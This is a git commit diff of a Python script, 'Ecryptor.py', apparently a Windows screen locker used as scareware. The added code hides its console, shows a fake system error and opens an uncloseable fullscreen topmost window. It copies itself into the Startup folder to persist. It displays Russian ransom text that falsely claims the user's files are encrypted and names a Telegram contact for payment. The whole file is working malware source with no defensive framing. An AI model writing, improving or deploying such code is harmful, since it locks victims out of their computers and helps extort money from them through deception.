5fe96439ce79511925e252c771c75c8de570abdd
k9gy67 <shedevroaboba@gmail.com>
2026-02-18 16:06:55 +0300

    Add files via upload

--- Ecryptor.py
+++ Ecryptor.py
@@ -1,10 +1,3 @@
-import tkinter as tk
-import ctypes
-import os
-import time
-import json
-from pathlib import Path
-
 print(r"""
     .o88o.                               o8o                .
     888 `"                               `"'              .o8
@@ -21,29 +14,55 @@ print(r"""
 
 
 """)
-win = input("введите от кого будет сделан винлокер: ")
 parol = input("введите пароль от винлокера: ")
+
+import tkinter as tk
+import os
+from tkinter import messagebox
+import shutil
+import sys
+import ctypes
+import time
+
+def add_to_startup_folder():
+    script_path = os.path.abspath(sys.argv[0])
+    
+    startup_folder = os.path.join(
+        os.environ["APPDATA"],
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+    )
+    
+    try:
+        shutil.copy2(script_path, startup_folder)
+    except Exception as e:
+        print(f"!✗ Ошибка: {e}")
+
+print("00x(2)00003 system error")
+
+time.sleep(1.5)
+
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
     user_input = entry.get().strip()  
-    if user_input == f"{parol}": 
-        messagebox.showinfo("молодец!", "пароль верный! можешь пользоватся системой :)")
-        root.destroy()  
+    if user_input == f"{parol}":  
+        messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
+        root.destroy() 
     else:
-        messagebox.showinfo("упс!", "неверный пароль!")
+         messagebox.showinfo("упс!", "неверный пароль!")
 
 root = tk.Tk()
 root.title("black hat winlocker")
 
 
 root.attributes("-fullscreen", True)
-root.configure(bg="black")
+root.configure(bg="blue")
 
 root.attributes("-topmost", True)
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-label = tk.Label(root, text=f"ваш виндовс заблокирован {win}", font=("Arial", 20))
+label = tk.Label(root, text="ваш виндовс заблокирован k9gy", font=("Arial", 20))
 label.pack(pady=20)
 
 
@@ -61,29 +80,53 @@ label = tk.Label(
     root,
     text="вас заметили",
     foreground="white",        
-    background="black",  
+    background="blue",  
     font=("Arial", 70),
     padx=10,
     pady=10
 )
 label.pack()
-
-def show_error_box(title, text):
-    ctypes.windll.user32.MessageBoxW(0, text, title, 0x00000010)
 
 
 label = tk.Label(
     root,
     text="👁",
     foreground="white",        
-    background="black",  
+    background="blue",  
     font=("Arial", 70),
     padx=10,
     pady=10
 )
 label.pack()
 
+label = tk.Label(
+    root,
+    text=r"""
+    упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
+    пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
+    Любая попытка обхода вируса карается повторным запуском вируса!""",
+    foreground="white",        
+    background="blue",  
+    font=("Arial", 30),
+    padx=10,
+    pady=10
+)
+label.pack()
 
-root.mainloop()
+label = tk.Label(
+    root,
+    text=r"""
+    для откупа вы можете связатся с нами
+    писать нужно в социальную сеть telegram
+    юзернейм автора @Halitava""",
+    foreground="white",        
+    background="blue",  
+    font=("Arial", 30),
+    padx=10,
+    pady=10
+)
 
-
+label.pack()
+if __name__ == "__main__":
+    add_to_startup_folder()
+    root.mainloop()
